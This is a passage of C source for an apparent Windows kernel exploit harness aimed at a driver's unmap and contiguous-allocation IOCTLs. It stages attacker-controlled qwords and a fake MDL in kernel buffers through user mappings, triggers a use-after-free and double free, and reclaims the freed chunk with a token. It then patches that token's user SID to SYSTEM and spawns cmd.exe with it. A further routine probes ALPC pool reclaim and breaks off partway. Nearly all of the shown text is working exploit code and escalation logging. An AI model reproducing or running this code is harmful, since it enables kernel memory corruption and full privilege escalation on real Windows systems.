                                    LogW(L"[M4d] capture len=0x%03x reply: "
                                         L"block=0x%016llx userVa=0x%016"
                                         L"llx", m4dLens[r4],
                                         (unsigned long long)cp4.block,
                                         (unsigned long long)cp4.userVa);
                                    if (!ReadProcessMemory(
                                            GetCurrentProcess(),
                                            (LPCVOID)(ULONG_PTR)cap.userVa,
                                            w2, sizeof(w2), &wbr2) ||
                                        wbr2 != sizeof(w2)) {
                                        LogW(L"[M4d] window read failed at "
                                             L"len=0x%03x", m4dLens[r4]);
                                        continue;
                                    }
                                    for (q = 0; q + 8 <= sizeof(w2);
                                         q += 8) {
                                        if ((*(UINT64 *)(w2 + q) >> 16) ==
                                            0x1337C0DE5555ULL) {
                                            found = 1;
                                            ProofLog(L"[+] --s2token cycle "
                                                     L"%u M4d: a len=0x%03x "
                                                     L"capture placed "
                                                     L"marker2 bytes INSIDE "
                                                     L"the fired chunk's "
                                                     L"window (offset "
                                                     L"+0x%02x) -- the "
                                                     L"freed space WAS "
                                                     L"absorbed and served "
                                                     L"to a larger alloc "
                                                     L"(coalesce/absorb "
                                                     L"model confirmed; "
                                                     L"v4.5 reclaims via "
                                                     L"merged-size "
                                                     L"objects)", c,
                                                     m4dLens[r4], q);
                                            break;
                                        }
                                    }
                                }
                                if (!found)
                                    ProofLog(L"[x] --s2token cycle %u M4d: "
                                             L"no larger capture (0x780/"
                                             L"0x800/0xE00/0x1400) served "
                                             L"the fired region either -- "
                                             L"absorption model dead; next "
                                             L"step = second-fire "
                                             L"destructive probe or "
                                             L"ntoskrnl autopsy", c);
                            }
                        }
                    } else {
                        LogW(L"[x] [M4b] paint/capture transport failed -- "
                             L"generic reclaim test inconclusive");
                    }
                }
                ProofLog(L"[i] cycle %u M5 (lure): ladder completed n=0..%u "
                         L"with no token reclaim of the fired chunk "
                         L"(last n tried=%u) -- stopping the run after the "
                         L"first fire (post-fire sweeps risk PFN-list "
                         L"corruption, run-13 0x4E/0x9A)", c, kMaxN, n);
                stopRun = TRUE;
                break;
            }

            /* M6: patch the landed token's User SID to S-1-5-18 through
             * the stale window, then verify THROUGH THE HANDLE */
            {
                UINT8  w[0x1000];
                SIZE_T br = 0;
                UINT32 nm = 0, np = 0, off;
                BOOL   rpm = ReadProcessMemory(GetCurrentProcess(),
                              (LPCVOID)(ULONG_PTR)cap.userVa, w, L, &br)
                             && br == L;
                BYTE   tu[0x400];
                DWORD  rl = 0;
                BOOL   verOK = FALSE;

                if (!rpm) {
                    LogW(L"[x] M6: window readback failed -- stop here, "
                         L"handle untouched");
                    CloseHandle(hTok);
                    continue;
                }
                for (off = 0; off + ownSidLen <= L; off++) {
                    if (memcmp(w + off, ownSid, ownSidLen) != 0)
                        continue;
                    nm++;
                    if (nm > 8)
                        break;
                    {
                        BOOL wok;
                        SIZE_T bw = 0;
                        BYTE   one = 1;
                        BYTE   sub12[4] = { 0x12, 0, 0, 0 };
                        UINT8  oldCnt = w[off + 1];

                        wok = WriteProcessMemory(GetCurrentProcess(),
                                  (LPVOID)(ULONG_PTR)(cap.userVa + off + 1),
                                  &one, 1, &bw) &&
                              WriteProcessMemory(GetCurrentProcess(),
                                  (LPVOID)(ULONG_PTR)(cap.userVa + off + 8),
                                  sub12, 4, &bw);
                        if (wok && oldCnt > 1)
                            wok = WriteProcessMemory(GetCurrentProcess(),
                                  (LPVOID)(ULONG_PTR)(cap.userVa + off + 12),
                                  zsub, (oldCnt - 1) * 4, &bw);
                        if (!wok) {
                            /* no VAD: WPM may refuse -- the stale PTEs are
                             * real, write through them directly */
                            UINT8 *vb = (UINT8 *)(uintptr_t)cap.userVa;

                            vb[off + 1] = 1;
                            *(volatile DWORD *)(vb + off + 8) = 0x12;
                            if (oldCnt > 1)
                                memcpy(vb + off + 12, zsub, (oldCnt - 1) * 4);
                        }
                        np++;
                        LogW(L"[M6] patched SID instance #%u @ win+0x%x "
                             L"(count %u -> 1, sub[0]=0x12)", nm, off,
                             oldCnt);
                    }
                }
                if (!nm) {
                    LogW(L"[x] M6: our user SID not found in the window -- "
                         L"the chunk holds no token we own");
                    CloseHandle(hTok);
                    continue;
                }
                /* E2E verify: GetTokenInformation THROUGH THE HANDLE must
                 * now read S-1-5-18 -- proves window and handle are the
                 * same kernel object */
                verOK = GetTokenInformation(hTok, TokenUser, tu, sizeof(tu),
                                            &rl) &&
                        rl >= 8 + 12 &&
                        memcmp(((TOKEN_USER *)tu)->User.Sid, kSysSid, 12)
                            == 0;
                if (verOK) {
                    patched++;
                    ProofLog(L"[+] --s2token cycle %u M6 (SID patch): "
                             L"verified THROUGH THE HANDLE -- TokenUser now "
                             L"S-1-5-18 (%u matches seen, %u patched)", c,
                             nm, np);
                } else {
                    LogW(L"[x] M6 verify FAILED: the handle's token does "
                         L"not read S-1-5-18 after the patch (window/body "
                         L"mismatch or foreign token) -- aborting that "
                         L"token, do NOT trust this state");
                    CloseHandle(hTok);
                    continue;
                }
            }

            /* M7: spawn cmd.exe /c whoami with the patched token */
            {
                HANDLE rp = NULL, wp = NULL;
                SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
                STARTUPINFOW si;
                PROCESS_INFORMATION pi;
                wchar_t cmd[] = L"cmd.exe /c whoami";
                char    out[0x800];
                DWORD   got = 0, total = 0;
                BOOL    okP;

                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESTDHANDLES;
                if (CreatePipe(&rp, &wp, &sa, 0)) {
                    si.hStdOutput = si.hStdError = wp;
                    SetHandleInformation(rp, HANDLE_FLAG_INHERIT, 0);
                }
                ZeroMemory(&pi, sizeof(pi));
                okP = CreateProcessWithTokenW(hTok, 0, NULL, cmd,
                                              CREATE_NO_WINDOW, NULL, NULL,
                                              &si, &pi);
                if (!okP)
                    LogW(L"[M7] CreateProcessWithTokenW failed GLE=%lu -- "
                         L"trying CreateProcessAsUserW with "
                         L"SeAssignPrimaryTokenPrivilege", GetLastError());
                if (!okP) {
                    TOKEN_PRIVILEGES tp;
                    LUID  luid;

                    ZeroMemory(&tp, sizeof(tp));
                    if (LookupPrivilegeValueW(NULL,
                                              SE_ASSIGNPRIMARYTOKEN_NAME,
                                              &luid)) {
                        tp.PrivilegeCount = 1;
                        tp.Privileges[0].Luid = luid;
                        tp.Privileges[0].Attributes =
                            SE_PRIVILEGE_ENABLED;
                        AdjustTokenPrivileges(hSelf, FALSE,
                                              &tp, 0, NULL, NULL);
                    }
                    ZeroMemory(&pi, sizeof(pi));
                    okP = CreateProcessAsUserW(hTok, NULL, cmd, NULL, NULL,
                                               TRUE, CREATE_NO_WINDOW, NULL,
                                               NULL, &si, &pi);
                }
                if (!okP) {
                    LogW(L"[x] M7: both spawn paths failed -- child not "
                         L"created");
                    CloseHandle(hTok);
                    continue;
                }
                WaitForSingleObject(pi.hProcess, 15000);
                while (total < sizeof(out) - 1 &&
                       ReadFile(rp, out + total,
                                (DWORD)(sizeof(out) - 1 - total), &got,
                                NULL) && got)
                    total += got;
                if (!total && rp) {
                    /* read one lap even if the first ReadFile came in
                     * before the child wrote */
                    Sleep(300);
                    ReadFile(rp, out + total, 1, &got, NULL);
                }
                out[total] = 0;
                LogW(L"[M7] child (pid %lu) whoami says: %hs", pi.dwProcessId,
                     out);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                CloseHandle(rp);
                CloseHandle(wp);
                if (strstr(out, "SYSTEM")) {
                    gotSys = TRUE;
                    LogW(L"[+] *** child whoami reads SYSTEM -- M7 "
                         L"accepted ***");
                }
                CloseHandle(hTok);
            }  /* M7 */
        }  /* L ladder */
        if (stopRun)
            break;
    }  /* cycles */

    {   /* housekeeping: the anchor is real-pair freeable (P2b-proven, the
         * one free path that unlocks); capture blocks (victim + donor)
         * stay live, as in every benign run this project has done */
        CONTIGREQ f = anchor;

        if (!DevCmdContigFree(&f))
            ProofLog(L"[x] anchor free failed (detail in the teelog)");
        else
            ProofLog(L"[+] anchor released (real-pair contigfree, proven "
                     L"benign in P2b)");
        ProofLog(L"[i] donor capture blocks left live on purpose (their "
                 L"user-map MDLs were freed by the 0xFFF028A8 worker; no "
                 L"PFN references hang on capture-style MDLs)");
    }
    ProofLog(L"[P3e] --s2token: cycles=%u len-ladder steps per cycle=%u "
             L"-- M1 leaked=%u M3 fired=%u M5 reclaimed=%u M6 patched=%u "
             L"M7 system-child=%ls", cycles, kLLadder, leaked, fired, recli,
             patched, gotSys ? L"YES" : L"no");
    if (gotSys) {
        ProofLog(L"[+] *** ADMIN -> SYSTEM ESCALATION COMPLETE: cmd.exe "
                 L"spawned as NT AUTHORITY\\SYSTEM; the chunk it was patched "
                 L"in was freed by the 0xFFF028A8 fire (double free "
                 L"load-bearing) ***");
        rc = 0;
    } else if (patched) {
        ProofLog(L"[?] M6 patch verified but M7 spawn failed -- send the log");
        rc = 1;
    } else if (recli) {
        ProofLog(L"[x] [ABORT] M5 reclaim landed but M6 verify failed -- "
                 L"window/handle mismatch; stop and send the log");
        rc = 2;
    } else {
        ProofLog(L"[x] [ABORT] no token reclaimed a fired chunk -- token "
                 L"bucket may exceed 0x1000 (single-page capture ceiling); "
                 L"send the log");
    }
    return rc;
}

/* v2.2 --s2fake: the OS's bugcheck recorder replaces the proof file as the
 * capture channel. Four runs proved ANY WriteFile after the poisoned
 * ExFreePool(KVA1) faults at nt+0xaa18fd inside WdFilter's hook (runs 1-3
 * the parent's verdict write; run-4 = the watcher child's transition write,
 * whose ~276 lost bytes are still visible as the NUL tail in s2watch.proof).
 * An in-call crash needs no post-fire write: fire#1 runs the differential
 * teardown (real MDL2), fire#2 -- issued back-to-back with NO write between
 * -- hands the worker B=KVA2 whose q16 is a FAKE MDL crafted inside
 * buffer2's user window. When MmUnmapLockedPages dereferences the fake
 * MDL's magic fields, the bugcheck lands IN-CALL with our magic in the
 * dump args -- recorded by the bugcheck reporter itself. Static craft:
 * fake MDL lands at fixed offset 0x40 inside buffer2 (1 page, page-aligned
 * KVA). */
static int HarnessS2Fake(void)
{
    CONTIGREQ c1, c2;
    UINT32 st = 0;
    UINT64 vq8     = 0x00007fff00001000ULL;  /* attacker-chosen invalid user VA */
    UINT64 fakeMdl;
    UINT64 magicProc = 0xffff8a0102030400ULL; /* MDL.Process  -> deref victim */
    UINT64 magicSys  = 0xffff8a0102030500ULL; /* MappedSystemVa fallback */

    Section(L"[P2c] fake-MDL deref leg -- in-call bugcheck capture (v2.2)");
    LogW(L"[!] runs 1-4: post-corruption WriteFile faults deterministically "
         L"(nt+0xaa18fd + WdFilter). v2.2 fires the differential, then "
         L"hands the worker a fake MDL crafted in buffer2 -- the in-call "
         L"bugcheck records OUR magic fields, no post-fire write anywhere");
    ProofLog(L"==== --s2fake (in-call capture, v2.2) ====");

    ZeroMemory(&c1, sizeof(c1)); ZeroMemory(&c2, sizeof(c2));
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &c1)) {
        ProofLog(L"[x] contig alloc #1 failed -- nothing fired");
        return 3;
    }
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &c2)) {
        ProofLog(L"[x] contig alloc #2 failed -- nothing fired (buffer1 leaked)");
        return 3;
    }
    fakeMdl = c2.kva + 0x40;
    ProofLog(L"[+] alloc1: KVA=0x%016llx userVa=0x%016llx MDL=0x%016llx",
             (unsigned long long)c1.kva, (unsigned long long)c1.userVa,
             (unsigned long long)c1.mdl);
    ProofLog(L"[+] alloc2: KVA=0x%016llx userVa=0x%016llx MDL=0x%016llx",
             (unsigned long long)c2.kva, (unsigned long long)c2.userVa,
             (unsigned long long)c2.mdl);

    /* stage EVERYTHING through the user windows BEFORE any fire:
     *  fire#1 (B=KVA1): q8=uv2, q16=MDL2   -> differential teardown + poison
     *  fire#2 (B=KVA2): q8=magic-VA, q16=fakeMDL -> in-call bugcheck on
     *                                             our fake MDL fields */
    {
        UINT8 *w1 = (UINT8 *)(uintptr_t)c1.userVa;
        UINT8 *w2 = (UINT8 *)(uintptr_t)c2.userVa;

        *(UINT64 *)(w1 + 0x08) = c2.userVa;      /* fire#1 q8  = uv2 */
        *(UINT64 *)(w1 + 0x10) = c2.mdl;         /* fire#1 q16 = MDL2 */
        *(UINT64 *)(w2 + 0x08) = vq8;            /* fire#2 q8  = magic VA */
        *(UINT64 *)(w2 + 0x10) = fakeMdl;        /* fire#2 q16 = fake MDL  */

        /* fake MDL (x64 layout: Next +0, Size +8, MdlFlags +A, Process +10,
         * MappedSystemVa +18, StartVa +20, ByteCount +28, ByteOffset +2C,
         * PFN array from +30) */
        *(UINT64 *)(w2 + 0x40) = 0;              /* Next */
        *(UINT16 *)(w2 + 0x48) = 0x40;           /* Size    = 4 PFNs */
        *(UINT16 *)(w2 + 0x4A) = 0x0004;         /* MdlFlags = MDL_PAGES_LOCKED */
        *(UINT64 *)(w2 + 0x50) = magicProc;      /* Process = MAGIC 1 */
        *(UINT64 *)(w2 + 0x58) = magicSys;       /* MappedSystemVa = MAGIC 2 */
        *(UINT64 *)(w2 + 0x60) = 0;              /* StartVa */
        *(UINT32 *)(w2 + 0x68) = 0x1000;         /* ByteCount */
        *(UINT32 *)(w2 + 0x6C) = 0;              /* ByteOffset */
        /* PFNs at w2+0x70 left zero */
    }
    ProofLog(L"[+] staged differential in buf1: q8=uv2=0x%016llx "
             L"q16=MDL2=0x%016llx",
             (unsigned long long)c2.userVa, (unsigned long long)c2.mdl);
    ProofLog(L"[+] staged fire#2 in buf2: q8=0x%016llx (chosen invalid VA) "
             L"q16=fakeMDL=0x%016llx (readback *(KVA2+8)=0x%016llx "
             L"*(KVA2+0x10)=0x%016llx)",
             vq8, fakeMdl,
             *(UINT64 *)((UINT8 *)(uintptr_t)c2.userVa + 0x08),
             *(UINT64 *)((UINT8 *)(uintptr_t)c2.userVa + 0x10));
    ProofLog(L"[i] fake MDL @0x%016llx: Next=%llx Size=0x%04x Flags=0x%04x "
             L"Process(magic1)=0x%016llx MappedSystemVa(magic2)=0x%016llx "
             L"StartVa=%llx ByteCount=0x%x",
             fakeMdl,
             *(UINT64 *)((UINT8 *)(uintptr_t)c2.userVa + 0x40),
             *(UINT16 *)((UINT8 *)(uintptr_t)c2.userVa + 0x48),
             *(UINT16 *)((UINT8 *)(uintptr_t)c2.userVa + 0x4A),
             *(UINT64 *)((UINT8 *)(uintptr_t)c2.userVa + 0x50),
             *(UINT64 *)((UINT8 *)(uintptr_t)c2.userVa + 0x58),
             *(UINT64 *)((UINT8 *)(uintptr_t)c2.userVa + 0x60),
             *(UINT32 *)((UINT8 *)(uintptr_t)c2.userVa + 0x68));
    ProofLog(L"[!] firing #1 (B=KVA1, real differential) then #2 (B=KVA2, "
             L"fake MDL) back-to-back, NO writes between -- in-call "
             L"bugcheck expected inside fire#2 with our magic in P1/P2");

    if (!DevCmdUnmap(c1.kva, &st)) {
        ProofLog(L"[x] fire#1 failed GLE=%lu (nothing corrupted yet)",
                 GetLastError());
        return 3;
    }
    if (!DevCmdUnmap(c2.kva, &st)) {
        ProofLog(L"[x] fire#2 failed GLE=%lu", GetLastError());
        return 3;
    }
    /* both returned: the fake-MDL derefs did not fault -- the familiar
     * poison path now runs; this line may itself die. Dump args are the
     * verdict channel only if the bugcheck landed in-call. */
    ProofLog(L"[!] both fires RETURNED (no in-call crash) -- fake-MDL field "
             L"deres did not fault with this craft; expect the familiar "
             L"delayed poison crash");
    Sleep(5000);
    return 2;
}

static int HarnessS2Live(void)
{
    CONTIGREQ c1, c2;
    UINT32 st = 0;
    MEMORY_BASIC_INFORMATION m;
    BOOL uv1Alive, uv2Alive;

    Section(L"[P2b] stage-2 live-MDL deref proof -- differential (q8/q16 = buffer2's userVa+MDL; block = buffer1)");
    LogW(L"[!] after the fire: uv2 (deref target) must DIE while uv1 (not "
         L"referenced by the worker) stays LIVE -- the differential proves "
         L"the worker consumed OUR staged qwords");
    LogW(L"[!] v2.0: the verdict is owned by the --s2watch child (spawned "
         L"below); the parent goes SILENT after the fire -- its next "
         L"WriteFile is the deterministic poison site (nt+0xaa18fd + "
         L"WdFilter, both prior runs)");
    ProofLog(L"==== --s2live (differential, v2.0 silent-parent) ====");

    ZeroMemory(&c1, sizeof(c1)); ZeroMemory(&c2, sizeof(c2));
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &c1)) {
        ProofLog(L"[x] contig alloc #1 failed -- nothing fired");
        return 3;
    }
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &c2)) {
        ProofLog(L"[x] contig alloc #2 failed -- nothing fired (buffer1 leaked)");
        return 3;
    }
    ProofLog(L"[+] alloc1: KVA=0x%016llx userVa=0x%016llx MDL=0x%016llx",
             (unsigned long long)c1.kva, (unsigned long long)c1.userVa,
             (unsigned long long)c1.mdl);
    ProofLog(L"[+] alloc2: KVA=0x%016llx userVa=0x%016llx MDL=0x%016llx",
             (unsigned long long)c2.kva, (unsigned long long)c2.userVa,
             (unsigned long long)c2.mdl);

    /* stage q8 = uv2, q16 = MDL2 inside buffer1 (the block the worker reads) */
    *(UINT64 *)((UINT8 *)(uintptr_t)c1.userVa + 0x08) = c2.userVa;
    *(UINT64 *)((UINT8 *)(uintptr_t)c1.userVa + 0x10) = c2.mdl;
    ProofLog(L"[+] staged in block1: q8=uv2=0x%016llx q16=MDL2=0x%016llx "
             L"(readback *(KVA1+8)=0x%016llx *(KVA1+0x10)=0x%016llx)",
             (unsigned long long)c2.userVa, (unsigned long long)c2.mdl,
             (unsigned long long)*(UINT64 *)((UINT8 *)(uintptr_t)c1.userVa + 0x08),
             (unsigned long long)*(UINT64 *)((UINT8 *)(uintptr_t)c1.userVa + 0x10));

    uv1Alive = VirtualQuery((LPCVOID)(uintptr_t)c1.userVa, &m, sizeof(m))
               && m.State == MEM_COMMIT;
    uv2Alive = VirtualQuery((LPCVOID)(uintptr_t)c2.userVa, &m, sizeof(m))
               && m.State == MEM_COMMIT;
    ProofLog(L"[i] before fire: uv1 %ls uv2 %ls",
             uv1Alive ? L"LIVE" : L"DEAD", uv2Alive ? L"LIVE" : L"DEAD");
    if (!uv1Alive || !uv2Alive) {
        ProofLog(L"[x] pre-fire sanity failed -- nothing fired");
        return 3;
    }

    /* v2.0: spawn the watcher child BEFORE the fire */
    {
        wchar_t cmd[520], exe[512];
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        if (!GetModuleFileNameW(NULL, exe, 500)) {
            ProofLog(L"[x] cannot resolve exe path -- no watcher, not firing");
            return 3;
        }
        _snwprintf(cmd, 518, L"\"%s\" --s2watch %lu 0x%016llx 0x%016llx",
                   exe,
                   (unsigned long)GetCurrentProcessId(),
                   (unsigned long long)c1.userVa,
                   (unsigned long long)c2.userVa);
        if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                            NULL, NULL, &si, &pi)) {
            ProofLog(L"[x] watcher spawn failed GLE=%lu -- nothing fired",
                     GetLastError());
            return 3;
        }
        ProofLog(L"[+] watcher child pid=%lu spawned for parent pid=%lu "
                 L"(uv1=0x%016llx uv2=0x%016llx)",
                 (unsigned long)pi.dwProcessId,
                 (unsigned long)GetCurrentProcessId(),
                 (unsigned long long)c1.userVa,
                 (unsigned long long)c2.userVa);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Sleep(400);     /* let the child commit its t0 lines + start polling */
    }

    ProofLog(L"[!] firing unmap worker at KVA1 0x%016llx with q8/q16 = "
             L"buffer2's live VA+MDL -- parent SILENT after this line",
             (unsigned long long)c1.kva);
    if (!DevCmdUnmap(c1.kva, &st)) {
        ProofLog(L"[x] stage-2 DeviceIoControl failed GLE=%lu (pre-corruption "
                 L"failure: the watcher child will time out harmlessly)",
                 GetLastError());
        return 3;
    }

    /* v2.0: parent stays ALIVE but SILENT -- every further write passes the
     * WdFilter hook that faulted both prior runs at the freed reservation.
     * Sleep is the lightest kernel call; the child owns the verdict. */
    Sleep(5000);
    return 0;
}

static int HarnessStage2(UINT64 q8, UINT64 q16, BOOL force)
{
    /* v1.7 -- redesigned stage 2. The free-list choreography died on 24H2
     * (E1.0/E1.2 0/200, E1.4: >=2 consecutive frees go deferred), and the
     * phys-read page walk died on the MmMapIoSpace PA-range limit (E1.5:
     * aligned CR3 page 0x73c4000 FAILS vs PA 0x1000 OK). The new target is
     * the 0xFFF028AC contiguous-buffer family: the worker allocates a
     * contiguous kernel buffer, MDLs it, user-maps the SAME pages
     * (MmMapLockedPagesSpecifyCache UserMode) and replies BOTH addresses:
     * kernel VA (+0x28) and user VA (+0x18). That is a live kernel buffer
     * at a KNOWN KVA whose +0x08/+0x10 (the exact fields the unmap worker
     * derefs) are writable from user mode. No capture, no pool choreography,
     * no leaks needed. The A8 anti-pattern (attacker-supplied block pointer,
     * deref without validation) remains the load-bearing hole. */
    CONTIGREQ cr;
    UINT32 st = 0;

    Section(L"[P2] stage-2 controlled-primitive trigger (DESTRUCTIVE) -- v2 contig-target");
    (void)force;
    LogW(L"[!] plan: 0xFFF028AC alloc 1 page (known KVA + user-mapped) -> "
         L"write q8@+0x08 q16@+0x10 through the user mapping -> fire the "
         L"unmap worker (0xFFF028A8) at the kernel address");
    LogW(L"[!] deref targets: MmUnmapLockedPages(q8, q16); IoFreeMdl(q16); "
         L"ExFreePool(KVA). q8=0x%016llx q16=0x%016llx",
         (unsigned long long)q8, (unsigned long long)q16);
    LogW(L"[!] expected: bugcheck inside the unmap call unless q8/q16 are "
         L"valid; teelog + minidump are the proof of deref control. Take a "
         L"fresh VM snapshot NOW if you do not have one");

    ZeroMemory(&cr, sizeof(cr));
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &cr)) {
        LogW(L"[x] contiguous alloc failed -- nothing fired");
        return 3;
    }
    LogW(L"    alloc: KVA=0x%016llx userVa=0x%016llx MDL=0x%016llx PA=0x%llx",
         (unsigned long long)cr.kva, (unsigned long long)cr.userVa,
         (unsigned long long)cr.mdl, (unsigned long long)cr.physPa);
    if (!cr.kva || !cr.userVa || cr.userVa >= 0x800000000000ULL) {
        LogW(L"[x] alloc reply incomplete -- refusing to fire");
        return 3;
    }
    *(UINT64 *)((UINT8 *)(uintptr_t)cr.userVa + 0x08) = q8;
    *(UINT64 *)((UINT8 *)(uintptr_t)cr.userVa + 0x10) = q16;
    LogW(L"[+] qwords staged through the user mapping; readback: "
         L"*(KVA+8)=0x%016llx *(KVA+0x10)=0x%016llx",
         (unsigned long long)*(UINT64 *)((UINT8 *)(uintptr_t)cr.userVa + 0x08),
         (unsigned long long)*(UINT64 *)((UINT8 *)(uintptr_t)cr.userVa + 0x10));
    LogW(L"[!] >>> crash expected inside this call unless q8/q16 are benign <<<");
    if (!DevCmdUnmap(cr.kva, &st))
        LogW(L"[x] stage-2 DeviceIoControl failed GLE=%lu (did the worker "
             L"return an error before deref?)", GetLastError());
    else
        LogW(L"[+] [P2] stage-2 RETURNED: driver status=%u -- the worker "
             L"deref'd OUR qwords at a KNOWN kernel address: "
             L"MmUnmapLockedPages(0x%016llx, 0x%016llx), IoFreeMdl, and "
             L"ExFreePool'd the live contiguous buffer 0x%016llx while our "
             L"user mapping 0x%016llx still exists: controlled UAF with "
             L"attacker-writable stale state",
             st, (unsigned long long)q8, (unsigned long long)q16,
             (unsigned long long)cr.kva, (unsigned long long)cr.userVa);
    return 0;
}

/* ---------------- [P1]/E2: ALPC queued-message occupancy probe -----------
 *
 * Fallback reclaimer measurement (the design brief's PRIMARY OS-side
 * candidate). KNOWN CAVEAT, stated up front: on x64 the PORT_MESSAGE kernel
 * header is 0x28 bytes, so a queued plain message allocates >= 0x38 of chunk
 * -- expected to MISS the 0x30 'ADIO' bucket. This mode measures the miss
 * empirically instead of assuming it. Setup: one ALPC port, a server thread
 * that accepts exactly one connection and then NEVER receives again, so
 * every client send sits in the port message queue as a live pool
 * allocation until the port is closed. */
typedef struct _PORTMSG {              /* PORT_MESSAGE, x64 */
    UINT32 hdr1;                       /* DataLength | TotalLength<<16 */
    UINT32 hdr2;                       /* Type | DataInfoOffset<<16    */
    UINT64 clientId[2];
    UINT32 messageId;
    UINT32 pad;
    UINT64 viewSize;
} PORTMSG;
C_ASSERT(sizeof(PORTMSG) == 0x28);

typedef LONG ESC_NTSTATUS;
typedef ESC_NTSTATUS (NTAPI *fn_AlpcCreatePort)(HANDLE *, OBJECT_ATTRIBUTES *,
                                                void *);
typedef ESC_NTSTATUS (NTAPI *fn_AlpcConnectPort)(HANDLE *, UNICODE_STRING *,
                                                 OBJECT_ATTRIBUTES *, void *,
                                                 ULONG, void *, PORTMSG *,
                                                 ULONG *, void *, void *,
                                                 void *);
typedef ESC_NTSTATUS (NTAPI *fn_AlpcSendWaitReceivePort)(HANDLE, ULONG, void *,
                                                         void *, void *,
                                                         void *, void *,
                                                         void *);
static fn_AlpcCreatePort          pCreatePort;
static fn_AlpcConnectPort         pConnectPort;
static fn_AlpcSendWaitReceivePort pSendWait;
static HANDLE g_alpcPort, g_alpcStop, g_alpcConnected;

static void AlpcInitUS(UNICODE_STRING *us, const wchar_t *s)
{
    us->Length = (USHORT)(wcslen(s) * sizeof(WCHAR));
    us->MaximumLength = (USHORT)(us->Length + sizeof(WCHAR));
    us->Buffer = (PWSTR)s;
}

static void AlpcInitObjAttr(OBJECT_ATTRIBUTES *oa, UNICODE_STRING *us)
{
    oa->Length = sizeof(*oa);
    oa->RootDirectory = NULL;
    oa->ObjectName = us;
    oa->Attributes = 0x40;              /* OBJ_CASE_INSENSITIVE */
    oa->SecurityDescriptor = NULL;
    oa->SecurityQualityOfService = NULL;
}

static DWORD WINAPI AlpcServerThread(LPVOID p)
{
    PORTMSG rx;
    ULONG rxLen;
    LARGE_INTEGER to;

    (void)p;
    to.QuadPart = -10000000LL;          /* relative 1 s */
    for (;;) {
        rxLen = sizeof(rx);
        /* first successful receive completes the connection */
        if (pSendWait(g_alpcPort, 0, NULL, NULL, &rx, &rxLen, NULL, &to) == 0) {
            SetEvent(g_alpcConnected);
            /* keep the port open but NEVER receive again: every queued
             * message stays allocated until the port is closed */
            for (;;) {
                if (WaitForSingleObject(g_alpcStop, 500) == WAIT_OBJECT_0)
                    return 0;
            }
        }
        if (WaitForSingleObject(g_alpcStop, 0) == WAIT_OBJECT_0)
            return 0;
    }
}

/* extra stack arg on every dynamic ntdll call keeps x64 caller-cleanup safe
 * even if this build's stub takes a parameter fewer than we pass */

static wchar_t g_connName[64];
static HANDLE  g_connHandle;
static DWORD   g_connDone;
static ESC_NTSTATUS g_connStatus;

static DWORD WINAPI AlpcConnectProc(LPVOID p)
{
    UNICODE_STRING us;
    OBJECT_ATTRIBUTES oa;
    HANDLE hConn = NULL;

    (void)p;
    AlpcInitUS(&us, g_connName);
    AlpcInitObjAttr(&oa, &us);
    g_connStatus = pConnectPort(&hConn, &us, NULL, NULL, 0, NULL, NULL, NULL,
                                NULL, NULL, NULL);
    if (g_connStatus == 0)
        g_connHandle = hConn;
    g_connDone = 1;
    return 0;
}

static ESC_NTSTATUS AlpcSendBuf(HANDLE h, const UINT8 *data, UINT32 len)
{
    UINT8 buf[0x100];
    PORTMSG *m;

    if (sizeof(PORTMSG) + len > sizeof(buf) || !len)
        return 0xC000000D;
    ZeroMemory(buf, sizeof buf);
    m = (PORTMSG *)buf;
    m->hdr1 = (UINT32)len | ((UINT32)(0x28 + len) << 16);
    m->hdr2 = 1;                        /* LPC_REQUEST */
    memcpy(buf + sizeof(PORTMSG), data, len);
    return pSendWait(h, 0, buf, NULL, NULL, NULL, NULL, NULL);
}

/* --alpc N: occupancy probe against the seeded 0x30 bucket. Returns
 * 0 measured / 1 weak result / >=3 setup failure. */
static int HarnessAlpc(UINT32 trials, UINT32 dlen)
{
    wchar_t name[64];
    HMODULE nt;
    HANDLE hConn = NULL, hThread = NULL, hConnThread = NULL;
    UINT32 t, hit = 0, sent = 0, miss = 0;
    int rc = 0;

    Section(L"[P1]/E2 ALPC queued-message occupancy probe (benign)");
    if (dlen == 0 || dlen > 0x60) {
        LogW(L"[x] --alen must be 1..96 (send buffer limit)");
        return 2;
    }
    nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) {
        LogW(L"[x] no ntdll handle");
        return 3;
    }
    pCreatePort  = (fn_AlpcCreatePort)GetProcAddress(nt, "NtAlpcCreatePort");
    pConnectPort = (fn_AlpcConnectPort)GetProcAddress(nt, "NtAlpcConnectPort");
    pSendWait    = (fn_AlpcSendWaitReceivePort)(void *)
                   GetProcAddress(nt, "NtAlpcSendWaitReceivePort");
    if (!pCreatePort || !pConnectPort || !pSendWait) {
        LogW(L"[x] NtAlpc* exports missing from ntdll -- --alpc unsupported "
             L"on this build");
        return 3;
    }
    _snwprintf(name, 63, L"\\RPC Control\\amdesc_%lu", GetCurrentProcessId());
    name[63] = 0;
    g_alpcPort = NULL;
    {
        OBJECT_ATTRIBUTES oa;
        UNICODE_STRING us;
        AlpcInitUS(&us, name);
        AlpcInitObjAttr(&oa, &us);
        if (pCreatePort(&g_alpcPort, &oa, NULL)) {
            LogW(L"[x] NtAlpcCreatePort failed for %ls", name);
            return 3;
        }
    }
    g_alpcStop = CreateEventW(NULL, TRUE, FALSE, NULL);
    g_alpcConnected = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_alpcStop || !g_alpcConnected) {
        LogW(L"[x] event creation failed GLE=%lu", GetLastError());
        rc = 3;
        goto alpc_fail;
    }
    hThread = CreateThread(NULL, 0, AlpcServerThread, NULL, 0, NULL);
    if (!hThread) {
        LogW(L"[x] server thread creation failed GLE=%lu", GetLastError());
        rc = 3;
